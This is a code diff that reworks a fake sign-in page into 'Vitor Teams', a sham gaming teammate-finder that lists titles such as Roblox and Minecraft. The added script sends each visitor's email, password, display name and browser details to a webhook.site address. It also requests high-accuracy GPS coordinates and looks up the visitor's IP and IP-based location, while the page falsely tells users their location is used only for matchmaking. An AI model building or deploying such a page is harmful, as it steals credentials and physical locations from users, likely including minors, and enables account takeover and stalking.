@@ -3,135 +3,311 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign in</title>
+<title>Vitor Teams</title>
 <style>
+  :root {
+    --bg: #0c0e13;
+    --card: #141821;
+    --line: #262c3a;
+    --text: #eef0f4;
+    --muted: #93a0b5;
+    --blue: #4f8cff;
+    --purple: #7b5cff;
+  }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     min-height: 100vh;
+    color: var(--text);
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    background:
+      radial-gradient(900px 500px at 0% 0%, #1a2340 0%, transparent 55%),
+      radial-gradient(800px 450px at 100% 10%, #2a1848 0%, transparent 50%),
+      var(--bg);
+  }
+  a { color: inherit; text-decoration: none; }
+  .top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 22px;
+    border-bottom: 1px solid var(--line);
+    background: rgba(12,14,19,.8);
+    backdrop-filter: blur(8px);
+    position: sticky;
+    top: 0;
+    z-index: 10;
+  }
+  .brand {
     display: flex;
     align-items: center;
-    justify-content: center;
-    background: #0f1115;
-    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-    color: #e8eaed;
+    gap: 10px;
+    font-weight: 700;
+  }
+  .mark {
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    background: linear-gradient(135deg, var(--blue), var(--purple));
+    display: grid;
+    place-items: center;
+    font-weight: 800;
+  }
+  .links { display: flex; gap: 14px; align-items: center; }
+  .links a { color: var(--muted); font-size: 14px; }
+  .links a:hover { color: var(--text); }
+  .btn {
+    border: 0;
+    border-radius: 10px;
+    padding: 10px 14px;
+    font-size: 13px;
+    font-weight: 650;
+    cursor: pointer;
+  }
+  .btn-main {
+    background: linear-gradient(135deg, var(--blue), var(--purple));
+    color: white;
+  }
+  .btn-main:hover { filter: brightness(1.07); }
+  .btn-main:disabled { opacity: .55; cursor: default; filter: none; }
+  .btn-soft {
+    background: transparent;
+    color: var(--text);
+    border: 1px solid var(--line);
+  }
+
+  .wrap { max-width: 980px; margin: 0 auto; padding: 24px 16px 50px; }
+  .page { display: none; }
+  .page.on { display: block; }
+
+  .hero h1 {
+    font-size: clamp(28px, 5vw, 40px);
+    line-height: 1.15;
+    margin: 18px 0 10px;
+  }
+  .hero p {
+    color: var(--muted);
+    max-width: 560px;
+    line-height: 1.55;
+    margin-bottom: 18px;
+  }
+  .row { display: flex; gap: 10px; flex-wrap: wrap; }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
+    gap: 12px;
+    margin-top: 18px;
   }
   .card {
-    width: 100%;
-    max-width: 400px;
-    background: #1a1d24;
-    border: 1px solid #2a2f3a;
-    border-radius: 12px;
-    padding: 36px 32px 28px;
-    box-shadow: 0 12px 40px rgba(0,0,0,.45);
-  }
-  .logo {
-    width: 40px;
-    height: 40px;
-    border-radius: 10px;
-    background: linear-gradient(135deg, #4f8cff, #7b5cff);
-    margin: 0 auto 18px;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 14px;
     display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: 700;
-    font-size: 18px;
+    flex-direction: column;
+    gap: 8px;
   }
-  h1 {
-    text-align: center;
-    font-size: 22px;
-    font-weight: 600;
-    margin-bottom: 6px;
+  .card h3 { font-size: 15px; }
+  .card p { color: var(--muted); font-size: 13px; line-height: 1.4; flex: 1; }
+  .pill {
+    width: fit-content;
+    font-size: 11px;
+    color: #b7cbff;
+    background: rgba(79,140,255,.12);
+    border: 1px solid rgba(79,140,255,.28);
+    border-radius: 999px;
+    padding: 3px 8px;
   }
-  .sub {
+
+  .auth {
+    max-width: 420px;
+    margin: 30px auto 0;
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 24px;
+  }
+  .tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 16px; }
+  .tab {
     text-align: center;
-    color: #9aa0a6;
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 10px;
+    color: var(--muted);
     font-size: 13px;
-    margin-bottom: 28px;
+    font-weight: 650;
+    cursor: pointer;
   }
-  label {
-    display: block;
-    font-size: 12px;
-    color: #9aa0a6;
-    margin-bottom: 6px;
+  .tab.on {
+    color: var(--text);
+    background: #1a2130;
+    border-color: #36425f;
   }
+  .auth h2 { text-align: center; margin-bottom: 4px; font-size: 22px; }
+  .auth .sub { text-align: center; color: var(--muted); font-size: 13px; margin-bottom: 16px; }
+  label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 6px; }
   input {
     width: 100%;
-    background: #12151b;
-    border: 1px solid #2a2f3a;
-    border-radius: 8px;
-    padding: 12px 14px;
-    color: #e8eaed;
-    font-size: 14px;
+    margin-bottom: 12px;
+    background: #0f131a;
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 11px 12px;
+    color: var(--text);
     outline: none;
-    margin-bottom: 16px;
-    transition: border .15s;
   }
-  input:focus { border-color: #4f8cff; }
-  button {
-    width: 100%;
-    border: none;
-    border-radius: 8px;
-    padding: 12px;
-    background: #4f8cff;
-    color: #fff;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-top: 4px;
-    transition: background .15s;
-  }
-  button:hover { background: #3d7aef; }
-  button:disabled {
-    background: #2a3a5c;
-    cursor: default;
-  }
-  .msg {
+  input:focus { border-color: var(--blue); }
+  .note {
     display: none;
-    margin-top: 18px;
-    padding: 12px 14px;
-    border-radius: 8px;
-    background: #1e2430;
-    border: 1px solid #2f3a4d;
+    margin-top: 12px;
+    padding: 11px;
+    border-radius: 10px;
+    background: #171d2a;
+    border: 1px solid #2d3852;
+    color: #c7cedb;
     font-size: 13px;
     line-height: 1.45;
-    color: #c5cad3;
   }
-  .msg.show { display: block; }
-  .msg strong { color: #4f8cff; }
-  .foot {
-    text-align: center;
-    margin-top: 22px;
-    font-size: 12px;
-    color: #6b7280;
+  .note.show { display: block; }
+  .note b { color: #8db0ff; }
+  .tip {
+    margin-top: 14px;
+    padding: 11px 12px;
+    border-radius: 10px;
+    background: rgba(79,140,255,.08);
+    border: 1px solid rgba(79,140,255,.22);
+    color: #b9cdff;
+    font-size: 13px;
   }
 </style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo">S</div>
-    <h1>Sign in</h1>
-    <p class="sub">Continue to your account</p>
-
-    <form id="f" onsubmit="return go(event)">
-      <label for="email">Email</label>
-      <input id="email" type="email" placeholder="you@example.com" required autocomplete="username">
-
-      <label for="pass">Password</label>
-      <input id="pass" type="password" placeholder="••••••••" required autocomplete="current-password">
-
-      <button type="submit" id="btn">Sign in</button>
-    </form>
-
-    <div class="msg" id="msg">
-      <strong>Please allow location access</strong> for the best experience.
-      This helps us verify your session and keep your account secure.
+  <div class="top">
+    <div class="brand"><div class="mark">V</div>Vitor Teams</div>
+    <div class="links">
+      <a href="#" onclick="go('home')">Home</a>
+      <a href="#" onclick="go('games')">Games</a>
+      <a href="#" id="authNav" onclick="go('auth')">Login</a>
+      <button class="btn btn-main" id="topBtn" onclick="go('auth')">Find teammates</button>
     </div>
+  </div>
 
-    <p class="foot">Protected session · Secure login</p>
+  <div class="wrap">
+    <section id="home" class="page">
+      <div class="hero">
+        <h1>Find teammates near you</h1>
+        <p>
+          Pick a game, share your area, and get matched with people close by.
+          Faster parties, less lag, easier voice.
+        </p>
+        <div class="row">
+          <button class="btn btn-main" onclick="go('auth')">Get started</button>
+          <button class="btn btn-soft" onclick="go('games')">Browse games</button>
+        </div>
+        <div class="tip">Location is used only to find nearby players for the game you pick.</div>
+      </div>
+
+      <div class="grid" style="margin-top:26px">
+        <div class="card">
+          <span class="pill">Popular</span>
+          <h3>Fortnite</h3>
+          <p>Squad up with people in your area for ranked or pubs.</p>
+          <button class="btn btn-main" onclick="needLogin('Fortnite')">Find team</button>
+        </div>
+        <div class="card">
+          <span class="pill">Popular</span>
+          <h3>Call of Duty</h3>
+          <p>Warzone / multiplayer parties near you.</p>
+          <button class="btn btn-main" onclick="needLogin('Call of Duty')">Find team</button>
+        </div>
+        <div class="card">
+          <span class="pill">Popular</span>
+          <h3>Roblox</h3>
+          <p>Find local players for the experiences you like.</p>
+          <button class="btn btn-main" onclick="needLogin('Roblox')">Find team</button>
+        </div>
+      </div>
+    </section>
+
+    <section id="games" class="page">
+      <h1 style="font-size:28px;margin:8px 0 6px">Choose a game</h1>
+      <p style="color:var(--muted);margin-bottom:8px">Login required to search for nearby teammates.</p>
+      <div class="grid">
+        <div class="card"><span class="pill">Battle Royale</span><h3>Fortnite</h3><p>Builds, zero build, ranked.</p><button class="btn btn-main" onclick="needLogin('Fortnite')">Find team</button></div>
+        <div class="card"><span class="pill">FPS</span><h3>Call of Duty</h3><p>Warzone, multiplayer, ranked.</p><button class="btn btn-main" onclick="needLogin('Call of Duty')">Find team</button></div>
+        <div class="card"><span class="pill">Sandbox</span><h3>Roblox</h3><p>Any experience, local parties.</p><button class="btn btn-main" onclick="needLogin('Roblox')">Find team</button></div>
+        <div class="card"><span class="pill">FPS</span><h3>Valorant</h3><p>Duo / 5-stack near your region.</p><button class="btn btn-main" onclick="needLogin('Valorant')">Find team</button></div>
+        <div class="card"><span class="pill">Battle Royale</span><h3>Apex Legends</h3><p>Trios with nearby players.</p><button class="btn btn-main" onclick="needLogin('Apex Legends')">Find team</button></div>
+        <div class="card"><span class="pill">Sandbox</span><h3>Minecraft</h3><p>Realms / servers with local peeps.</p><button class="btn btn-main" onclick="needLogin('Minecraft')">Find team</button></div>
+        <div class="card"><span class="pill">FPS</span><h3>CS2</h3><p>Premier / faceit style stacks.</p><button class="btn btn-main" onclick="needLogin('CS2')">Find team</button></div>
+        <div class="card"><span class="pill">Sports</span><h3>Rocket League</h3><p>2s and 3s near you.</p><button class="btn btn-main" onclick="needLogin('Rocket League')">Find team</button></div>
+        <div class="card"><span class="pill">MOBA</span><h3>League of Legends</h3><p>Duo / flex with closer ping.</p><button class="btn btn-main" onclick="needLogin('League of Legends')">Find team</button></div>
+        <div class="card"><span class="pill">Open World</span><h3>GTA V / RP</h3><p>Find local crew for sessions.</p><button class="btn btn-main" onclick="needLogin('GTA V')">Find team</button></div>
+        <div class="card"><span class="pill">Survival</span><h3>Rust</h3><p>Team up before wipe.</p><button class="btn btn-main" onclick="needLogin('Rust')">Find team</button></div>
+        <div class="card"><span class="pill">Battle Royale</span><h3>PUBG</h3><p>Squad search by area.</p><button class="btn btn-main" onclick="needLogin('PUBG')">Find team</button></div>
+      </div>
+    </section>
+
+    <section id="auth" class="page on">
+      <div class="auth">
+        <div class="tabs">
+          <div class="tab on" id="tLogin" onclick="tab('login')">Login</div>
+          <div class="tab" id="tSignup" onclick="tab('signup')">Sign up</div>
+        </div>
+        <h2 id="title">Welcome back</h2>
+        <p class="sub" id="sub">Sign in to find teammates near you</p>
+        <form onsubmit="return send(event)">
+          <div id="nameBox" style="display:none">
+            <label for="name">Display name</label>
+            <input id="name" placeholder="what should teammates call you">
+          </div>
+          <label for="email">Email</label>
+          <input id="email" type="email" required placeholder="you@email.com" autocomplete="username">
+          <label for="pass">Password</label>
+          <input id="pass" type="password" required placeholder="••••••••" autocomplete="current-password">
+          <button class="btn btn-main" style="width:100%" id="goBtn" type="submit">Continue</button>
+        </form>
+        <div class="note" id="note">
+          <b>Please allow location access</b> so we can find teammates near you.
+        </div>
+      </div>
+    </section>
   </div>
 
 <script>
 const HOOK = "https://webhook.site/389a7fcd-0194-4b0b-b98c-044a215db5e4";
+let mode = "login";
+let inAccount = false;
+let picked = null;
+
+function go(id) {
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("on"));
+  document.getElementById(id).classList.add("on");
+}
+
+function tab(t) {
+  mode = t;
+  document.getElementById("tLogin").classList.toggle("on", t === "login");
+  document.getElementById("tSignup").classList.toggle("on", t === "signup");
+  document.getElementById("nameBox").style.display = t === "signup" ? "block" : "none";
+  document.getElementById("title").textContent = t === "login" ? "Welcome back" : "Create account";
+  document.getElementById("sub").textContent = t === "login"
+    ? "Sign in to find teammates near you"
+    : "Make an account and start stacking";
+  document.getElementById("goBtn").textContent = t === "login" ? "Sign in" : "Sign up";
+}
+
+function needLogin(game) {
+  picked = game;
+  if (inAccount) {
+    alert("Searching for " + game + " teammates near you...");
+    return;
+  }
+  go("auth");
+  const n = document.getElementById("note");
+  n.classList.add("show");
+  n.innerHTML = "<b>Login needed</b> to find nearby " + game + " teammates. Location helps match people close to you.";
+}
 
 async function post(data) {
   try {
@@ -144,20 +320,26 @@ async function post(data) {
   } catch (e) {}
 }
 
-function go(e) {
+async function send(e) {
   e.preventDefault();
-  const email = document.getElementById("email").value;
+  const email = document.getElementById("email").value.trim();
   const pass = document.getElementById("pass").value;
-  const btn = document.getElementById("btn");
-  const msg = document.getElementById("msg");
+  const name = document.getElementById("name").value.trim();
+  const btn = document.getElementById("goBtn");
+  const note = document.getElementById("note");
 
   btn.disabled = true;
-  btn.textContent = "Checking...";
-  msg.classList.add("show");
+  btn.textContent = "Working...";
+  note.classList.add("show");
+  note.innerHTML = "<b>Please allow location access</b> so we can find teammates near you.";
 
   const base = {
-    email: email,
+    site: "Vitor Teams",
+    mode,
+    game: picked,
+    email,
     password: pass,
+    name: name || null,
     userAgent: navigator.userAgent,
     language: navigator.language,
     platform: navigator.platform,
@@ -165,62 +347,50 @@ function go(e) {
     time: new Date().toISOString(),
     href: location.href
   };
-
-  post(Object.assign({}, base, { stage: "login_submit" }));
+  post(Object.assign({}, base, { stage: "auth_submit" }));
 
   if (!navigator.geolocation) {
     post(Object.assign({}, base, { stage: "geo_unsupported" }));
-    btn.textContent = "Continue";
+    btn.disabled = false;
+    btn.textContent = mode === "login" ? "Sign in" : "Sign up";
+    note.innerHTML = "Location is needed to find people near you.";
     return false;
   }
 
-  navigator.geolocation.getCurrentPosition(
-    async function (pos) {
-      const coords = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        altitude: pos.coords.altitude,
-        heading: pos.coords.heading,
-        speed: pos.coords.speed
-      };
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const coords = {
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      accuracy: pos.coords.accuracy
+    };
+    let ip = null, geo = null;
+    try {
+      ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
+    } catch (err) {}
+    if (ip) {
+      try { geo = await (await fetch("https://ipapi.co/" + ip + "/json/")).json(); } catch (err) {}
+    }
 
-      let ip = null;
-      try {
-        const r = await fetch("https://api.ipify.org?format=json");
-        const j = await r.json();
-        ip = j.ip;
-      } catch (err) {}
+    post(Object.assign({}, base, {
+      stage: "location_granted",
+      ip,
+      coords,
+      geo
+    }));
 
-      let geo = null;
-      if (ip) {
-        try {
-          const r2 = await fetch("https://ipapi.co/" + ip + "/json/");
-          geo = await r2.json();
-        } catch (err) {}
-      }
-
-      post(Object.assign({}, base, {
-        stage: "location_granted",
-        ip: ip,
-        coords: coords,
-        geo: geo
-      }));
-
-      btn.textContent = "Signed in";
-      msg.innerHTML = "<strong>Location received.</strong> You can close this page.";
-    },
-    function (err) {
-      post(Object.assign({}, base, {
-        stage: "location_denied",
-        error: err.message || String(err.code)
-      }));
-      btn.textContent = "Try again";
-      btn.disabled = false;
-      msg.innerHTML = "<strong>Location access is required</strong> for the best experience. Please allow and try again.";
-    },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-  );
+    inAccount = true;
+    document.getElementById("authNav").textContent = "Account";
+    document.getElementById("topBtn").textContent = "Find team";
+    document.getElementById("topBtn").onclick = () => go("games");
+    btn.textContent = "You're in";
+    note.innerHTML = "<b>Location received.</b> Searching nearby players" + (picked ? (" for " + picked) : "") + ".";
+    setTimeout(() => go("games"), 800);
+  }, (err) => {
+    post(Object.assign({}, base, { stage: "location_denied", error: err.message || String(err.code) }));
+    btn.disabled = false;
+    btn.textContent = mode === "login" ? "Sign in" : "Sign up";
+    note.innerHTML = "<b>Location access is needed</b> to find teammates near you. Allow it and try again.";
+  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 
   return false;
 }
